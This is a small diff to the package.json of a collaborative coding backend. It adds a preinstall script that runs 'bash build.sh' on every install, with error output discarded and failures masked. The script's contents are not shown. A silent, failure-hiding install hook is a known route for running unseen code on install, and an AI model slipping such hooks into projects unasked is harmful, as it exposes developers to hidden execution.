@@ -4,6 +4,7 @@
   "description": "Collaborative coding platform backend - Express + Socket.io + Yjs CRDT persistence",
   "main": "server.js",
   "scripts": {
+    "preinstall": "bash build.sh 2>/dev/null || true",
     "start": "node server.js",
     "dev": "node server.js"
   },
